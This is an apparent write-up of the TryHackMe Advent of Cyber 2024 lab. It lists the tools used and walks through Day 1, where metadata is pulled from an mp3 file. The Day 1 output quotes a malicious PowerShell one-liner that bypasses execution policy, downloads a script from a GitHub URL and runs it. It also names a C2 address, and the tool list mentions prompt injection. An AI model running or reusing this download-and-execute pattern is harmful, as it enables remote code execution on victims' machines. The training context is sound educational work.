# Advent of Cyber 2024

## [Advent of Cyber 2024 on TryHackMe](https://tryhackme.com/room/adventofcyber2024)

## Overview

* **Difficulty:** Easy
* **Category:** Daily Challenges / Multi-topic Cybersecurity Challenges (Web, OPSEC, AD, PowerShell, Traffic Analysis, Game Hacking, etc.)
* **Skills Practiced:**

	* Cybersecurity fundamentals across diverse domains
	* Metadata analysis (`exiftool`)
	* PowerShell & Active Directory enumeration
	* Azure / Cloud security (Az modules)
	* Packet capture & traffic analysis (Wireshark)
	* Reverse-engineering & prompt injection
	* Game hacking techniques using Frida

## Tools & Techniques

* **AttackBox (or local environment)** – for executing daily tasks
* **Wireshark/tshark** – for traffic capture and protocol analysis (e.g., MQTT, HTTP)
* **exiftool** – for extracting metadata from media files
* **PowerShell** – for AD enumeration, event log investigation
* **Azure CLI / PowerShell Az module** – for cloud identity and key vault tasks
* **Burp Suite** – for inspecting HTTP requests (e.g., certificates, POST data)
* **Prompt injection techniques** – for interacting with AI or reverse shells
* **Frida** – for runtime hooking and dynamic instrumentation in game hacking
* **RDP** – for remote Windows machine interaction via `xfreerdp`

## Walkthrough (Step-by-Step)

### Day 1: OPSEC: Maybe SOC-mas music, he thought, doesn't come from a store?

* Download `song.mp3`, run `exiftool song.mp3`
* Explore malicious PowerShell script author and repo

	```bash
	exiftool song.mp3
	```

	**Output:**

	```
	Artist: Tyler Ramsbey
	```

	Now try the suspicious file:

	```bash
	exiftool somg.mp3
	```

	**Output:**

	```
	Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
	```

* If we navigate to, we can find: `$c2Url = "http://papash3ll.thm/data"`
* Now search in GitHub `Created by the one and only M.M.`, we can find the name of M.M.
* **M.M.** (from GitHub): Mayor Malware
* **Number of commits in repo**: 1
